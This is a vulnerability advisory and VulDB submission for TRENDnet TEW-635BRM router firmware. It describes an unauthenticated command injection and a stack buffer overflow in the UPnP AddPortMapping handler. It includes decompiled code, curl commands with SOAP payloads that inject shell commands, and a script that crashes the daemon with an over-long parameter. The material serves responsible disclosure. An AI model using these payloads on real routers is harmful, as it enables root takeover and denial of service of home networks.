# [CVE-TBD] TRENDnet TEW-635BRM 1.00.1C OS Command Injection (CWE-78) ; Stack-based Buffer Overflow (CWE-121)

## VulDB Submission Fields

- Vendor: TRENDnet
- Product: TEW-635BRM
- Version or Commit: 1.00.1C
- Vulnerability: OS Command Injection (CWE-78) ; Stack-based Buffer Overflow (CWE-121)
- Advisory / Exploit URL: replace this with the URL of this directory after copying it to your public repository
- Description:

```
An OS command injection vulnerability was discovered in TRENDnet TEW-635BRM (hardware v1.0R) firmware V1.0(1.00.1C). The UPnP SOAP handler AddPortMapping of /usr/sbin/upnpd copies the attacker-controlled string parameters NewInternalClient, NewProtocol and NewRemoteHost directly into iptables command lines that are executed with system() as root (function addPortForward at 0x00406f18: sprintf into "iptables -t nat -I PREROUTING -d %s -p %s --dport %d -j DNAT --to %s:%d" and "iptables -I FORWARD -d %s -p %s --dport %d -s %s -j ACCEPT", then system()). The SOAP interface on TCP port 49152 requires no authentication, and the daemon is started as "upnpd nas0 br0 30 4", binding both the WAN (nas0) and LAN (br0) interfaces. DeletePortMapping (delPortForward) is affected by the same pattern. Reproduction: curl -X POST http://<router>:49152/upnp/control/WANIPConn1 -H 'SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping' --data-binary @poc.xml with NewInternalClient set to "192.168.10.100;/bin/echo UPNP_INJECT_OK >/tmp/upnpwn;" returns HTTP 200 AddPortMappingResponse and the file /tmp/upnpwn is created on the device by root; injection via NewProtocol succeeds equally. An unauthenticated remote attacker executes arbitrary commands as root: full read/write of configuration and credentials, firewall manipulation, malware download and persistence; no user interaction is required and the factory-default configuration is vulnerable. Proposed CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8). A stack-based buffer overflow vulnerability was discovered in TRENDnet TEW-635BRM (hardware v1.0R) firmware V1.0(1.00.1C). The same sprintf() used to build iptables commands in the UPnP AddPortMapping handler of /usr/sbin/upnpd (addPortForward at 0x00406f18) targets a 256-byte stack buffer with no length check; over-long SOAP string parameters (NewInternalClient, NewProtocol or NewRemoteHost) overflow the buffer and overwrite saved registers and the saved return address. The SOAP interface on TCP port 49152 requires no authentication and the daemon binds both WAN (nas0) and LAN (br0) interfaces. DeletePortMapping (delPortForward) is affected by the same pattern. Reproduction: an AddPortMapping request with a 600-byte NewInternalClient reliably kills all upnpd threads (pre-authentication denial of service until manual restart); threshold calibration shows 180 bytes succeed while 200 bytes crash; a 260-byte De Bruijn-pattern payload produces SIGSEGV with epc=ra=0x41202d70, i.e. the program counter is consumed by overflow data (control-flow hijack verified; exploit offset calibration not performed). An unauthenticated remote attacker obtains control-flow hijacking of a root daemon on a platform without ASLR (Linux 2.6), and can trivially and repeatedly deny the UPnP service. Proposed CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8).
```

---

## Technical Disclosure

# CVE-TBD: TRENDnet TEW-635BRM upnpd `AddPortMapping` Pre-Authentication OS Command Injection (root)

## Affected Product

- Vendor: TRENDnet
- Product: TEW-635BRM (hardware revision v1.0R)
- Firmware: V1.0(1.00.1C) — latest version available for this hardware revision (published 2010-06-18 on downloads.trendnet.com)
- Component: `/usr/sbin/upnpd` (Sercomm-customized IGD stack; TCP 49152 + SSDP UDP 1900), started as `upnpd nas0 br0 30 4` — bound to **both the WAN (nas0) and LAN (br0) interfaces**

## Summary

The UPnP SOAP handler for `AddPortMapping` copies the attacker-controlled
string parameters `NewInternalClient`, `NewProtocol` and `NewRemoteHost`
directly into `iptables` command lines that are executed with `system()`
**as root**. The SOAP interface requires **no authentication at all**.
Any unauthenticated network client that can reach the UPnP port can
execute arbitrary shell commands as root, e.g. via
`NewInternalClient = 192.168.10.100;<cmd>;`. The same pattern exists in
`DeletePortMapping` (`delPortForward`). Because the daemon is bound to
the WAN interface as well, the issue is exposed beyond the LAN whenever
WAN-side firewall rules permit the traffic.

## Vulnerability Type / CWE

- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

## Root Cause

Decompiled `addPortForward` (upnpd, 0x00406f18):

```c
char auStack_128[256];
// template 1:
sprintf(auStack_128,
 "iptables -t nat -I PREROUTING -d %s -p %s --dport %d -j DNAT --to %s:%d",
 extIP, proto /*NewProtocol*/, extPort, intClient /*NewInternalClient*/, intPort);
system(auStack_128); // ← executed as root, no sanitization
// template 2 (when NewRemoteHost is present):
sprintf(auStack_128,
 "iptables -I FORWARD -d %s -p %s --dport %d -s %s -j ACCEPT",
 intClient, proto, intPort, remoteHost /*NewRemoteHost*/);
system(auStack_128);
```

- All `%s` substitutions come verbatim from the SOAP request — there is
 no validation, escaping or quoting.
- `delPortForward` (0x004070b0, action `DeletePortMapping`) builds
 analogous `iptables -D` commands the same way.
- The daemon runs with a normal root environment (full PATH), so injected
 commands can use plain names (`iptables`, `wget`, `tftp`, …).

## Proof of Concept (non-destructive)

```bash
curl -s -X POST http://<ROUTER_IP>:49152/upnp/control/WANIPConn1 \
 -H 'SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping' \
 -H 'Content-Type: text/xml' \
 --data-binary @addpm_inject.xml
```

`addpm_inject.xml` (marker-file injection via `NewInternalClient`):

```xml
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost>
<NewExternalPort>8899</NewExternalPort>
<NewProtocol>TCP</NewProtocol>
<NewInternalPort>8899</NewInternalPort>
<NewInternalClient>192.168.10.100;/bin/echo UPNP_INJECT_OK &gt;/tmp/upnpwn;</NewInternalClient>
<NewEnabled>1</NewEnabled>
<NewPortMappingDescription>test</NewPortMappingDescription>
<NewLeaseDuration>0</NewLeaseDuration>
</u:AddPortMapping>
</s:Body>
</s:Envelope>
```

Observed on the rehosted firmware: HTTP 200 `AddPortMappingResponse`, and
inside the device the file `/tmp/upnpwn` exists with content
`UPNP_INJECT_OK` (created by root). The same injection through
`NewProtocol` (`TCP;/bin/echo UPNP_PROTO_INJECT >/tmp/upnpproto;`) equally
succeeds (`/tmp/upnpproto` = `UPNP_PROTO_INJECT`). Control requests with
legitimate values only add the port-mapping and create no files.

## Impact

- **Pre-authentication remote code execution as root** on the router:
 full read/write of configuration and credentials (PPPoE/Wi-Fi/admin
 secrets in nvram), firewall manipulation (`;iptables -F;`), malware
 download (`wget`/`tftp`), persistence, botnet enrollment.
- LAN-side exploitation is always possible; WAN-side exploitation depends
 on the device's firewall rules for the UPnP port (the daemon itself
 listens on the WAN interface).
- No user interaction required; the factory-default configuration is
 vulnerable.

## Proposed CVSS 3.1

`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **9.8 (Critical)**

## Discovery

- Date: 2026-10-12
- Method: firmware rehosting (QEMU full-system emulation) + static reverse engineering (Ghidra) + dynamic SOAP verification

## Timeline

- 2026-10-12: Vulnerability discovered and verified (NewInternalClient and NewProtocol injection, root marker files)
- 2026-10-13: Vendor notification sent
- TBD: CVE ID assignment
- TBD: Public disclosure

# CVE-TBD: TRENDnet TEW-635BRM upnpd `AddPortMapping` Pre-Authentication Stack-Based Buffer Overflow (PC Control Verified)

## Affected Product

- Vendor: TRENDnet
- Product: TEW-635BRM (hardware revision v1.0R)
- Firmware: V1.0(1.00.1C) — latest version available for this hardware revision (published 2010-06-18 on downloads.trendnet.com)
- Component: `/usr/sbin/upnpd` (Sercomm-customized IGD stack; TCP 49152 + SSDP UDP 1900), bound to **both WAN (nas0) and LAN (br0) interfaces**

## Summary

The same `sprintf()` used to build `iptables` commands in the UPnP
`AddPortMapping` handler targets a **256-byte stack buffer** with no
length check. Over-long SOAP parameters (`NewInternalClient`,
`NewProtocol`, or `NewRemoteHost`) overflow the buffer and overwrite the
saved return address and saved registers. The overflow is reachable
**without authentication**, was verified to hijack the program counter
(`epc`/`ra` overwritten by overflow data), and — at larger sizes —
reliably kills all threads of the daemon (pre-authentication denial of
service). `DeletePortMapping` (`delPortForward`) is affected by the same
pattern.

This issue is reported separately from the command injection in the same
function (different vulnerability class and different remediation);
together they make the UPnP service a fully unauthenticated attack
surface.

## Vulnerability Type / CWE

- CWE-121: Stack-based Buffer Overflow

## Root Cause

Decompiled `addPortForward` (upnpd, 0x00406f18):

```c
char auStack_128[256]; // stack buffer
sprintf(auStack_128,
 "iptables -t nat -I PREROUTING -d %s -p %s --dport %d -j DNAT --to %s:%d",
 extIP, proto, extPort, intClient, intPort); // intClient/proto unbounded
...
sprintf(auStack_128,
 "iptables -I FORWARD -d %s -p %s --dport %d -s %s -j ACCEPT",
 intClient, proto, intPort, remoteHost); // remoteHost unbounded
```

The expanded command line is written into 256 bytes of stack. SOAP string
parameters are attacker-controlled in content and length; the command
template itself already occupies ~60 bytes, so roughly ≥ 200 bytes of
parameter data smash the saved registers/return address.

## Proof of Concept (non-destructive)

```bash
# 600-byte NewInternalClient -> upnpd crash (all threads die = service down)
python3 - <<'PY' > addpm_overflow.xml
pad = "A"*600
print(f"""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost>
<NewExternalPort>8899</NewExternalPort>
<NewProtocol>TCP</NewProtocol>
<NewInternalPort>8899</NewInternalPort>
<NewInternalClient>{pad}</NewInternalClient>
<NewEnabled>1</NewEnabled>
<NewPortMappingDescription>test</NewPortMappingDescription>
<NewLeaseDuration>0</NewLeaseDuration>
</u:AddPortMapping>
</s:Body>
</s:Envelope>""")
PY
curl -s -X POST http://<ROUTER_IP>:49152/upnp/control/WANIPConn1 \
 -H 'SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping' \
 -H 'Content-Type: text/xml' --data-binary @addpm_overflow.xml
```

Observed on the rehosted firmware:

- Threshold calibration: `NewInternalClient` of 180 bytes → normal
 `AddPortMappingResponse`; **200 bytes → SIGSEGV of upnpd**.
- 260-byte De Bruijn-pattern payload → kernel log:
 `do_page_fault(): sending SIGSEGV to upnpd`, with
 **`epc = ra = 0x41202d70`** — the program counter and return address are
 overwritten with bytes of the overflowing command line (the reported
 value corresponds to content bytes of the overflowed `sprintf` output,
 i.e. the saved `ra` is consumed by overflow data; exact offset
 calibration for a full exploit was not performed).
- 600-byte payload → every upnpd thread dies; the UPnP service stays
 down until manual restart (complete pre-authentication DoS).

## Impact

- Pre-authentication control-flow hijacking of a root daemon. Production
 devices run Linux 2.6 without ASLR, so return-oriented exploitation is
 realistic; a companion pre-authentication command injection in the same
 function already provides direct command execution.
- Trivially repeatable pre-authentication denial of service of the UPnP
 service (and, through process-wide corruption, potential stability
 impact on the device).
- Reachable from the LAN unconditionally; reachable from the WAN side
 whenever firewall rules expose the UPnP port (the daemon binds the WAN
 interface itself).

## Proposed CVSS 3.1

`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **9.8 (Critical)**
(PC control verified; C/I impact rated per control-flow hijack of a root
process on a no-ASLR platform, A:H per verified persistent service loss.)

## Discovery

- Date: 2026-10-12
- Method: firmware rehosting (QEMU full-system emulation) + static reverse engineering (Ghidra) + dynamic crash/hijack verification

## Timeline

- 2026-10-12: Vulnerability discovered and verified (crash threshold, epc/ra hijack, full service DoS)
- 2026-10-13: Vendor notification sent
- TBD: CVE ID assignment
- TBD: Public disclosure

## Proof of Concept

See the poc file(s) in this directory.
